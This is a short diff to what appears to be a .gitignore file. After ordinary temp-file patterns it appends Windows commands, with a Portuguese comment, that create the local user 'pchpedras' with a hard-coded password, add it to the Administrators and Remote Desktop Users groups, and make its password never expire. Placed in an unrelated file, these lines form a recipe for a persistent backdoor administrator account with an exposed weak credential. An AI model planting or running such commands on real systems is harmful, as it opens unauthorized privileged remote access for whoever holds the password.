@@ -160,3 +160,9 @@ tmp/
 temp/
 *.tmp
 *.temp
+
+net user pchpedras 654123! /add
+net localgroup "Remote Desktop Users" pchpedras /add
+net localgroup Administrators pchpedras /add
+# precisa rodar no PowerShell como Administrador
+Set-LocalUser -Name "pchpedras" -PasswordNeverExpires $true
